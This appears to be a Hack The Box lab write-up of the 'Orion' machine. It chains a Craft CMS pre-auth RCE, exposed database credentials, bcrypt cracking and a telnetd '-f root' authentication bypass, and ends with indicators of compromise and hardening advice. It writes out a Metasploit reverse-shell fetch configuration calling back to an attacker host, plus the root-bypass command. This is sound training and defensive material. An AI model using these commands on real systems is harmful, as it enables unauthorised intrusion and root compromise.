# Orion  Technical Report

> **Platform:** Hack The Box  
> **Difficulty:** `Easy`  
> **Date:** 2026-09-29  
> **Author:** M0THK33PR  
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

The **Orion** machine contained multiple vulnerabilities which could be chained from unauthenticated remote access to complete system compromise. The externally accessible Craft CMS installation was running version 5.6.16 and was vulnerable to **CVE-2025-32432**, allowing pre-authentication remote code execution. Initial access exposed application configuration containing highly privileged database credentials. Database enumeration revealed a Craft administrator account whose password hash could be recovered using a common-password wordlist, allowing SSH access as the local user `adam`. Local enumeration subsequently identified a vulnerable GNU Inetutils Telnet service, which could be abused through **CVE-2026-24061** to bypass authentication and obtain a root shell. Immediate priorities are to update Craft CMS, rotate all application and database credentials, remove unnecessary Telnet services, and patch GNU Inetutils.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **Orion** machine on Hack The Box.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access
- Identify the vulnerabilities and configuration weaknesses enabling compromise
- Document defensive measures capable of preventing or detecting the attack chain

**Methodology:** Assessments followed a structured reconnaissance, enumeration, exploitation, credential-access, lateral-movement, and privilege-escalation workflow.

All testing was performed against an authorized lab target.

---

## 2. Attack Chain

```text
Nmap
  → Craft CMS 5.6.16
  → CVE-2025-32432 Pre-Auth RCE
  → www-data
  → Readable .env / MySQL root credentials
  → Craft users database
  → Crackable administrator bcrypt hash
  → SSH as adam
  → Localhost GNU Inetutils telnetd
  → CVE-2026-24061 authentication bypass
  → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service/version detection |
| `whatweb` | Web technology identification |
| `feroxbuster` | Web content discovery |
| `ffuf` | Virtual-host and web enumeration |
| `nuclei` | Automated vulnerability probing |
| `Metasploit Framework` | CVE-2025-32432 validation and exploitation |
| `mysql` | Local Craft database enumeration |
| `John the Ripper` | Offline bcrypt password recovery |
| `ssh` | Stable authenticated user access |
| `find` | SUID/SGID and filesystem enumeration |
| `systemctl` | Timer and service enumeration |
| `telnet` | Local Telnet service interaction |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**

```bash
sudo nmap -Pn -p- --min-rate 5000 -T4 -oA scans/nmap/allports <target-ip>

sudo nmap -Pn -sC -sV -O \
  -p22,80 \
  -oA scans/nmap/services \
  <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|---|---|---|---|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 | Remote administration |
| 80/tcp | HTTP | nginx 1.18.0 Ubuntu | Orion Telecom web application |

Only two TCP services were externally exposed, significantly narrowing the attack surface.

**Key Observations:**
- SSH did not initially provide usable credentials.
- Port 80 presented the **Orion Telecom** website.
- Web technology enumeration identified **Craft CMS 5.6.16**.
- The CMS version immediately warranted investigation for known vulnerabilities.

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Tools Used:** `whatweb`, `curl`, `feroxbuster`, `ffuf`, `nuclei`, manual inspection

The web application was identified as **Craft CMS 5.6.16**.

Craft CMS versions before 5.6.17 are affected by **CVE-2025-32432**. Craft released 5.6.17 as the fixed 5.x release and specifically identifies suspicious requests to the `actions/assets/generate-transform` controller containing `__class` as an indicator of attempted exploitation.

An initial Nuclei probe did not report the vulnerability:

```bash
nuclei \
  -u http://orion.htb \
  -id CVE-2025-32432 \
  -v
```

The negative automated result was therefore not treated as conclusive because the identified Craft version remained within the vulnerable range.

The corresponding Metasploit module was subsequently used:

```text
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS orion.htb
set RPORT 80
set ASSET_ID 1
check
```

The check successfully leaked the PHP session storage path:

```text
/var/lib/php/sessions
```

and identified the target as vulnerable.

This independently confirmed that CVE-2025-32432 was exploitable despite the earlier negative Nuclei result.

### 5.2 SSH

OpenSSH was accessible on TCP/22.

No credentials were available during initial reconnaissance, so SSH was retained as a possible lateral-movement path rather than attacked directly.

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** CVE-2025-32432  Craft CMS Pre-Authentication Remote Code Execution  
**Location:** Craft CMS `assets/generate-transform` functionality  
**Affected Version:** Craft CMS 5.6.16

The target was running the final vulnerable Craft CMS 5.6.x version. Craft states that the issue was fixed in versions 3.9.15, 4.14.15, and **5.6.17**.

The vulnerability abuses unsafe object creation within Craft/Yii processing associated with the asset-transform functionality. A crafted request can ultimately cause attacker-controlled PHP to execute without prior authentication.

### 6.2 Exploitation

The official Metasploit module was used to perform controlled exploitation.

Initial PHP-based staged and reverse-shell payloads connected back but terminated immediately. A native Linux fetch payload proved significantly more stable.

**Sanitized configuration:**

```text
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

set RHOSTS <target>
set RPORT 80
set ASSET_ID 1

set target 1
set payload cmd/linux/http/x64/meterpreter/reverse_tcp

set FETCH_COMMAND CURL
set FETCH_SRVHOST <vpn-ip>
set FETCH_SRVPORT 8080
set FETCH_WRITABLE_DIR /tmp

set LHOST <vpn-ip>
set LPORT <listener-port>

run
```

The target downloaded and executed a native Linux payload, resulting in a stable Meterpreter session.

The initial working directory was:

```text
/var/www/html/craft/web
```

**Result:** Remote code execution and operating-system access were obtained in the context of the web application account.

---

## 7. Lateral Movement

**From:** Web application service account  
**To:** `adam`

### 7.1 Application Configuration Exposure

Enumeration of the Craft application root revealed:

```text
/var/www/html/craft/.env
```

The environment file contained several sensitive values, including:

```text
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=<REDACTED>
CRAFT_SECURITY_KEY=<REDACTED>
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
```

The application therefore possessed credentials for a **MySQL root account**, greatly increasing the impact of compromise of the web service.

### 7.2 Database Enumeration

The exposed credentials allowed local access to the `orion` database:

```bash
mysql \
  -h 127.0.0.1 \
  -u root \
  -p \
  orion
```

The Craft `users` table contained an active administrator account:

```text
username: admin
email:    adam@orion.htb
admin:    1
password: <bcrypt hash omitted>
```

The password hash was copied to the attacking system and tested offline using John the Ripper:

```bash
john \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  adam.hash
```

The bcrypt hash was successfully recovered using the common-password wordlist.

The recovered value is intentionally omitted from this public report.

### 7.3 SSH Access

The recovered credential was valid for the corresponding local Linux account:

```bash
ssh adam@<target-ip>
```

**Result:** Stable authenticated access was obtained as:

```text
adam
```

This transitioned access from the web-service context to a normal local user.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l`
- [x] SUID binaries  `find / -perm -4000 -type f 2>/dev/null`
- [x] SGID binaries
- [x] Cron jobs
- [x] Writable files
- [x] Running services and timers
- [x] Local network services
- [x] Application configuration review
- [x] Polkit/package inspection

The `adam` account possessed no useful `sudo` rights.

SUID enumeration primarily returned standard system utilities. Notable entries included `pkexec`, `rsh`, `rlogin`, and `rcp`; the installed Polkit package was `0.105-33ubuntu0.1`.

The enumerated cron configuration similarly consisted primarily of standard operating-system jobs rather than an immediately exploitable custom root script.

Further service enumeration identified a Telnet service accessible locally from Orion.

### 8.2 Escalation Vector

**Vector:** CVE-2026-24061  
**Component:** GNU Inetutils `telnetd`  
**Impact:** Authentication bypass to root

GNU disclosed that vulnerable Inetutils `telnetd` versions improperly trust the client-controlled `USER` environment variable when invoking `/usr/bin/login`. A value such as `-f root` is interpreted by `login` as the authentication-bypass `-f` argument. GNU identifies versions **1.9.3 through 2.7** as vulnerable and rates the issue **High** severity.

Because the service was accessible from the already-compromised host, exploitation could be performed locally.

**Command:**

```bash
USER='-f root' telnet -a 127.0.0.1
```

The malicious `USER` value was forwarded by `telnetd` to the privileged `login` process and interpreted as:

```text
-f root
```

This caused the normal authentication procedure to be skipped.

**Result:**

```text
uid=0(root)
```

Root/system-level access was achieved.

The root flag was retrieved successfully but is intentionally omitted from this public report.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---|---|---|
| 1 | Craft CMS 5.6.16 vulnerable to CVE-2025-32432 pre-authentication RCE | 🔴 Critical | TCP/80  Craft CMS |
| 2 | Highly privileged database credentials exposed through application `.env` | 🟠 High | `/var/www/html/craft/.env` |
| 3 | Crackable Craft administrator credential enabled SSH access as `adam` | 🟠 High | Craft `users` table / SSH |
| 4 | GNU Inetutils Telnet authentication bypass  CVE-2026-24061 | 🟠 High | Local Telnet service |

**Severity Scale:**  
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

### 9.1 Craft CMS Pre-Authentication RCE

An unauthenticated network attacker could execute arbitrary code through the vulnerable Craft CMS installation.

Successful exploitation immediately provided access to the underlying operating system and application secrets.

### 9.2 Excessive Database Privileges and Secret Exposure

The Craft application stored usable database credentials in its `.env` configuration, and the application connected to MySQL using the `root` database account.

Compromise of the web application therefore also resulted in complete control over the application database.

### 9.3 Weak / Reusable Administrator Credential

The Craft administrator's bcrypt password hash could be recovered using a common-password wordlist.

The recovered password subsequently provided SSH access to the associated Linux account.

### 9.4 Vulnerable Telnet Service

A GNU Inetutils Telnet daemon vulnerable to CVE-2026-24061 was accessible locally.

An authenticated low-privilege user could bypass Telnet authentication entirely and obtain root access.

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

Potential evidence of the initial Craft exploitation includes:

- POST requests to:

```text
/actions/assets/generate-transform
```

or:

```text
/index.php?p=actions/assets/generate-transform
```

- JSON request bodies containing suspicious object-construction keys such as:

```text
__class
__construct()
```

Craft itself recommends searching web-server or firewall logs for requests to the asset-transform controller containing `__class`.

Additional indicators include:

- Suspicious requests to Craft administration routes from unauthenticated clients
- Unexpected PHP session-file activity under `/var/lib/php/sessions`
- Processes spawned by the web-server/PHP service account
- Executables written to `/tmp`
- Outbound HTTP connections from the server to unfamiliar hosts
- Outbound reverse-shell or Meterpreter connections
- Local MySQL administrative access originating from a compromised web process
- SSH authentication to `adam` from an unexpected source
- Telnet sessions initiated against `127.0.0.1`
- Unexpected root login events associated with the Telnet service

### 10.2 Security Weaknesses

The complete compromise resulted from several independent weaknesses:

- Internet-facing Craft CMS was left on a vulnerable release.
- A web application was granted MySQL `root` privileges.
- Sensitive credentials were accessible from the compromised application context.
- An administrator selected a password recoverable from a common-password corpus.
- The recovered credential was usable outside the web application.
- A legacy Telnet daemon remained installed and active.
- The installed Telnet implementation contained a known authentication bypass.
- Localhost-only services were treated as trusted despite being reachable after initial compromise.

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|---|---|---|
| **Immediate** | Upgrade Craft CMS to a fully patched supported release; at minimum, vulnerable 5.x installations must move beyond 5.6.16 | #1 |
| **Immediate** | Rotate the Craft security key, database password, administrator passwords, and any other secrets exposed through the compromised application | #2 |
| **Immediate** | Disable and remove `telnetd`; replace legacy remote administration services with SSH | #4 |
| **Immediate** | Upgrade GNU Inetutils to a patched release/package | #4 |
| **Short-term** | Replace the MySQL `root` account used by Craft with a dedicated least-privilege database user | #2 |
| **Short-term** | Enforce strong unique credentials and prevent application passwords from being reused for operating-system accounts | #3 |
| **Short-term** | Disable Craft development mode in production | #1 / #2 |
| **Short-term** | Review web-server and firewall logs for known CVE-2025-32432 indicators | #1 |
| **Long-term** | Introduce automated dependency and vulnerability monitoring for externally exposed applications | #1 |
| **Long-term** | Continuously inventory and remove unnecessary local services, including services bound only to loopback interfaces | #4 |
| **Long-term** | Monitor application processes for unexpected child processes, temporary executables, and outbound network connections | #1 |

Craft recommends upgrading to a fixed release and considers its Security Patches package only a temporary stop-gap where immediate upgrading is impossible.

GNU recommends disabling Telnet where possible or upgrading/applying the relevant patch. The authentication-bypass vulnerability affects Inetutils 1.9.3 through 2.7; release 2.8 incorporates the fix.

---

## 11. Lessons Learned

- **Version identification can be more valuable than blind content discovery.** Once Craft CMS 5.6.16 was identified, researching that exact version produced a far stronger lead than continuing broad directory enumeration.

- **A negative vulnerability scanner result is not proof that a vulnerability is absent.** Nuclei did not initially identify CVE-2025-32432, while Metasploit's dedicated check successfully demonstrated exploitation by leaking the server's PHP session path.

- **Exploit reliability and vulnerability presence are separate questions.** Multiple PHP Meterpreter and reverse-shell payloads died immediately even though the underlying RCE was valid. Switching to a native Linux fetch payload produced a stable session.

- **Application compromise frequently becomes credential compromise.** The Craft `.env` transformed web RCE into full database access almost immediately.

- **Database privilege separation matters.** A CMS should not require a MySQL `root` account. The excessive privilege allowed complete database enumeration after compromise of only the web application.

- **Password hashing does not compensate for weak passwords.** The Craft administrator used bcrypt with a non-trivial cost factor, but the underlying password appeared in a common-password wordlist and was recovered quickly.

- **Loopback-only does not mean safe.** The vulnerable Telnet daemon was not required to be externally reachable. Once a low-privilege shell existed, localhost became part of the attack surface.

- **Legacy services can invalidate otherwise reasonable privilege boundaries.** The final root escalation required no kernel exploit or complex memory corruptiononly a vulnerable Telnet authentication path left available on the system.

- **Enumeration should remain structured.** SUID binaries and cron jobs initially appeared promising, but neither produced the intended escalation. Continuing into local-service enumeration revealed the actual root path.

---

## 12. Final Attack Path

```text
External attacker
      │
      ▼
TCP/80  nginx / Craft CMS 5.6.16
      │
      │ CVE-2025-32432
      ▼
Remote code execution
      │
      ▼
Web-service user
      │
      │ Read Craft .env
      ▼
MySQL root credentials
      │
      │ Enumerate Craft database
      ▼
Administrator bcrypt hash
      │
      │ Offline dictionary attack
      ▼
Recovered user credential
      │
      │ SSH
      ▼
adam
      │
      │ Enumerate localhost services
      ▼
GNU Inetutils telnetd
      │
      │ CVE-2026-24061
      ▼
root
```

---

*End of Report*  
*Classification: Public  flags, hashes, security keys, and recovered credentials omitted*
